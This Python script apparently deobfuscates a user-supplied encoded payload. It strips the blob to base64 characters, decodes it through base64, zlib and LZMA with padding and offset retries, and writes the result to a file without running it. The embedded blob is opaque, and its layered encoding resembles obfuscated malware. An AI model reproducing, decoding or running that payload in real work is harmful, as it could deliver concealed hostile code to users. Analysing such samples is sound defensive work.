import base64
import lzma
import zlib
import re

# The payload provided by the user (copy-pasted carefully)
IEPsVeNK = "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"""

# Deep clean: Keep ONLY valid Base64 characters and strip trailing single quote if present
clean_payload = re.sub(r'[^A-Za-z0-9+/=]', '', IEPsVeNK)

# The user might have sent a slightly corrupted string. 
# 8473 was the reported length. Let's try to fix it.
# b64 strings must be multiple of 4.

def try_decode(s):
    try:
        raw = base64.b64decode(s)
        # Order: Base64 -> Zlib -> LZMA
        z = zlib.decompress(raw)
        l = lzma.decompress(z)
        return l
    except:
        return None

# Try variations of the string
results = []
for i in range(len(clean_payload), len(clean_payload)-8, -1):
    test_str = clean_payload[:i]
    # Try different paddings
    for pad in ["", "=", "==", "==="]:
        res = try_decode(test_str + pad)
        if res:
            results.append(res)
            break
    if results: break

if results:
    with open("deobfuscated_payload.py", "wb") as f:
        f.write(results[0])
    print("SUCCESS: Payload deobfuscated.")
else:
    # Try removing potential extra character at the start too?
    for i in range(1, 4):
        test_str = clean_payload[i:]
        for pad in ["", "=", "==", "==="]:
            res = try_decode(test_str + pad)
            if res:
                results.append(res)
                break
        if results: break
    
    if results:
        with open("deobfuscated_payload.py", "wb") as f:
            f.write(results[0])
        print("SUCCESS: Payload deobfuscated with offset.")
    else:
        print("CRITICAL: Failed to deobfuscate.")
